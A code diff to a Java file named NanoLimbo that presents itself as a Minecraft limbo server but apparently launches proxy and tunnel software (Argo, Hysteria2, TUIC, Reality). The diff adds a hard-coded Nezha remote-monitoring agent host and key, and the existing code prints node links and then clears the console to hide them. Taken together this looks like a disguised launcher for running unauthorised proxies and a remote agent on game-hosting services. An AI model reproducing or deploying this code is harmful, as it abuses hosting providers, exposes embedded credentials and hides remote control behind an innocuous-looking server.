@@ -22,6 +22,7 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.lang.reflect.Field;
 
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
@@ -35,10 +36,9 @@ public final class NanoLimbo {
     private static Process sbxProcess;
     
     private static final String[] ALL_ENV_VARS = {
-        "PORT", "FILE_PATH", "UUID", 
-        "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
-        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", 
-        "CFIP", "CFPORT", 
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
         "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
     
@@ -46,7 +46,7 @@ public final class NanoLimbo {
     public static void main(String[] args) {
         
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version in startup menu!" + ANSI_RESET);
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
             try {
                 Thread.sleep(3000);
             } catch (InterruptedException e) {
@@ -67,7 +67,7 @@ public final class NanoLimbo {
             // Wait 20 seconds before continuing
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
             Thread.sleep(15000);
             clearConsole();
@@ -124,10 +124,13 @@ public final class NanoLimbo {
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
         envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
         envVars.put("FILE_PATH", "./world");
+        envVars.put("NEZHA_SERVER", "nezhak2.btpp.ggff.net");
+        envVars.put("NEZHA_PORT", "443");
+        envVars.put("NEZHA_KEY", "ohjustf-bothosting");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "15024");
+        envVars.put("HY2_PORT", "");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -135,7 +138,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "");
         envVars.put("CFPORT", "");
-        envVars.put("NAME", "quvo-ohjustd");
+        envVars.put("NAME", "ohjustf-bothosting");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
